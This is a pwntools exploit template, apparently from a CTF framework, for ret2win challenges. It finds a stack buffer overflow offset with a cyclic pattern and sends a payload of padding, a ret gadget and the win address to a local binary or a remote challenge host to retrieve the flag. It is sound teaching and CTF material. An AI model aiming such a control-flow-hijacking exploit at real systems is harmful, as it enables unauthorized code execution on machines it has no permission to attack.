#!/usr/bin/env python3
"""
ret2win pwntools solve script template.

PURPOSE
-------
Exploit a binary that contains a hidden "win" function.  The vulnerability
is a classic stack-based buffer overflow.  This script finds the offset,
builds the payload, and retrieves the flag.

USAGE
-----
1.  Set the CONFIG values below.
2.  Run locally first:   python3 ret2win.py
3.  Switch REMOTE = True and point to the server to exploit remotely.

REQUIREMENTS
------------
    pip install pwntools

AUTHOR: Sentinel CTF Framework
"""

# =============================================================================
# CONFIG — edit these values before running
# =============================================================================

EXE_PATH    = "./vuln"          # Path to the vulnerable binary
REMOTE_HOST = "chall.example.com"
REMOTE_PORT = 1337
REMOTE      = False             # Set True to connect to the remote server

# Address of the win function.
# Find it with:  objdump -d ./vuln | grep win
#            or: nm ./vuln | grep win
#            or: pwndbg> p win
WIN_ADDR    = 0x00000000004011b6  # PLACEHOLDER — replace!

# ret gadget for stack alignment (required on amd64 before glibc calls).
# Find with:  ROPgadget --binary ./vuln | grep ': ret'
#         or: ropper -f ./vuln --search 'ret'
RET_GADGET  = 0x000000000040101a  # PLACEHOLDER — replace!

# =============================================================================

from pwn import (  # type: ignore  # noqa: E402
    ELF,
    context,
    cyclic,
    cyclic_find,
    flat,
    log,
    p64,
    process,
    remote,
    ROP,
)


# ---------------------------------------------------------------------------
# Context setup
# ---------------------------------------------------------------------------

elf = ELF(EXE_PATH, checksec=True)
context.binary = elf
context.log_level = "info"    # Change to 'debug' for verbose I/O tracing


# ---------------------------------------------------------------------------
# Connection helper
# ---------------------------------------------------------------------------

def connect():
    """
    Return a pwntools tube connected to the target.

    Uses a local ``process`` when ``REMOTE`` is ``False`` (default) and a
    ``remote`` tube when ``REMOTE`` is ``True``.
    """
    if REMOTE:
        log.info(f"Connecting to {REMOTE_HOST}:{REMOTE_PORT} ...")
        return remote(REMOTE_HOST, REMOTE_PORT)
    else:
        log.info(f"Spawning local process: {EXE_PATH}")
        return process(EXE_PATH)


# ---------------------------------------------------------------------------
# Offset discovery
# ---------------------------------------------------------------------------

def find_offset() -> int:
    """
    Determine the number of padding bytes before the saved return address.

    Strategy
    --------
    1.  Send a De Bruijn cyclic pattern to the binary.
    2.  Observe the crash in pwndbg::

            $ gdb ./vuln
            (pwndbg) run <<< $(python3 -c "from pwn import *; print(cyclic(200))")
            (pwndbg) p $rip          # or info registers rip
            # copy the 4/8-byte value here

    3.  Call ``cyclic_find(0x<crash_value>)`` to get the exact offset.

    If the offset is already known, hard-code it and skip this function.

    Returns
    -------
    int
        Byte offset from buffer start to saved return address.
    """
    KNOWN_OFFSET: int | None = None  # Set to an int to skip discovery

    if KNOWN_OFFSET is not None:
        log.success(f"Using hard-coded offset: {KNOWN_OFFSET}")
        return KNOWN_OFFSET

    # --- Automated attempt (works when the binary prints crash info) ---
    pattern = cyclic(200)
    io = connect()
    io.sendlineafter(b">", pattern)          # adapt the prompt to your binary
    io.wait()
    core = io.corefile
    if core:
        rip_val = core.rip                   # for amd64
        offset  = cyclic_find(rip_val)
        log.success(f"Offset found via core dump: {offset}")
        return offset

    # --- Fallback: manual search ---
    # After running with the pattern, paste the 8-byte RIP value here:
    crash_rip = 0x6161616161616166  # PLACEHOLDER — paste from gdb
    offset     = cyclic_find(crash_rip)
    log.success(f"Offset: {offset}")
    return offset


# ---------------------------------------------------------------------------
# Exploit
# ---------------------------------------------------------------------------

def exploit(offset: int) -> bytes:
    """
    Build the ret2win payload and return the flag.

    The payload layout is::

        [offset * 'A'] [ret gadget (alignment)] [win_addr]

    The ``ret`` gadget aligns the stack to a 16-byte boundary before
    ``win()`` is called.  Without it, ``movaps`` instructions inside glibc
    (e.g. inside ``puts``) may raise a SIGSEGV.

    Parameters
    ----------
    offset:
        Number of padding bytes (from :func:`find_offset`).

    Returns
    -------
    bytes
        The flag string, or an empty bytes object on failure.
    """
    # ---- Build payload ----
    payload = flat(
        b"A" * offset,
        RET_GADGET,   # alignment ret — remove if not needed
        WIN_ADDR,
    )

    log.info(f"Payload length: {len(payload)} bytes")
    log.info(f"Payload hex:    {payload.hex()}")

    # ---- Send payload ----
    io = connect()

    # Adjust the send sequence to match the binary's prompts:
    io.recvuntil(b">")          # wait for prompt (edit or remove)
    io.sendline(payload)

    # ---- Receive flag ----
    io.recvuntil(b"flag{", timeout=5)   # edit pattern to match CTF flag format
    flag = b"flag{" + io.recvuntil(b"}", drop=False)
    io.close()

    log.success(f"Flag: {flag.decode(errors='replace')}")
    return flag


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    """Entry point — orchestrates offset discovery and exploitation."""
    offset = find_offset()
    log.info(f"Using offset: {offset}")
    flag = exploit(offset)
    if not flag:
        log.failure("Exploit failed — no flag received.")


if __name__ == "__main__":
    main()
